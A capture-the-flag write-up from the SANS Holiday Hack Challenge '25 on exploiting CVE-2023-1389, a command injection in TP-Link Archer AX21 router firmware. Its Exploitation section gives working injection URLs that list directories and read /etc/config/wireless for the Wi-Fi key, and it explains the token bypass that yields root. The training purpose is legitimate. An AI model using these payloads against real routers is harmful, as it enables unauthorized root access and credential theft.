> **Platform Name**: SANs Holiday Hack Challenge '25
> **Category**: #Web, #CVE, #CommandInjection
> **Author**: Joe Lipinski
---
## Table of Contents
1. [Introduction](#introduction)
2. [Setup](#Setup)
3. [Reconnaissance](#reconnaissance)
4. [Exploitation](#exploitation)
5. [Post-Exploitation/Flag](#Post-Exploitation/Flag)
6. [Lessons Learned](#lessons%20learned)
7. [References](#References)

---
## Introduction

**Objective:**
Exploit a known command injection vulnerability in a router's web interface to read a wireless configuration file containing the flag.

**Description:**
The challenge presents a router login page with a visible version number. Researching the version reveals CVE-2023-1389, a command injection vulnerability in the TP-Link Archer AX21 router's locale endpoint. The vulnerability allows unauthenticated command execution via a crafted GET request to `/cgi-bin/luci/`.

---
## Setup

- **Operating System:** Kali
- **Tools Used:** #Browser, #curl

---
## Reconnaissance

### Identify the Target
The router login page displays its model number and firmware version. Searching for this version number alongside "CVE" reveals:

- **CVE-2023-1389**: Unauthenticated command injection in TP-Link Archer AX21 via the `country` parameter in the locale endpoint

---
## Exploitation

### Command Injection via CVE-2023-1389
The vulnerability allows injecting shell commands into the `country` parameter of the locale write operation:

```
/cgi-bin/luci/;stok=/locale?operation=write&country=US;<command>
```

**Note:** The server output from the injected command is only visible after sending the request twice (refresh the page to see output).

### Enumerate the Filesystem
```
/cgi-bin/luci/;stok=/locale?operation=write&country=US;ls%20/
```

Configuration files are typically located in `/etc`. Navigate to it:

```
/cgi-bin/luci/;stok=/locale?operation=write&country=US;ls%20/etc/config
```

**Interesting Discoveries:**
- `wireless` — wireless configuration file

### Read the Wireless Configuration File
```
/cgi-bin/luci/;stok=/locale?operation=write&country=US;cat%20/etc/config/wireless
```

The file contains a `key` field with the flag value.

---
## Post-Exploitation/Flag

### Capturing the Flag
The flag is embedded in the `key` field of `/etc/config/wireless`.

---
## Lessons Learned

- **CVE research on version numbers**: When a target exposes its software version, immediately search for known CVEs. A version number on a login page is a free recon gift.
- **CVE-2023-1389 specifics**: This vulnerability requires no authentication and affects the `/cgi-bin/luci/` endpoint. The semicolon before `stok=` bypasses the token requirement; the injected command runs as root on the router.
- **Delayed output is a hint**: The need to submit twice before seeing output is characteristic of blind or semi-blind command injection — the command runs on the first request; the result surfaces on the second.
- **`/etc/config/` on OpenWrt routers**: TP-Link routers running OpenWrt store all configuration (including wireless keys) in flat files under `/etc/config/`. This is a well-known target directory for post-exploitation.

---
## References
- [CVE-2023-1389 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-1389)
- [CVE-2023-1389 write-up – cve.news](https://www.cve.news/cve-2023-1389/)
- [OpenWrt `/etc/config/wireless` format](https://openwrt.org/docs/guide-user/network/wifi/basic)
- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)

---
**Disclaimer**
This write-up is for educational purposes only. Always obtain proper authorization before testing or exploiting any system.
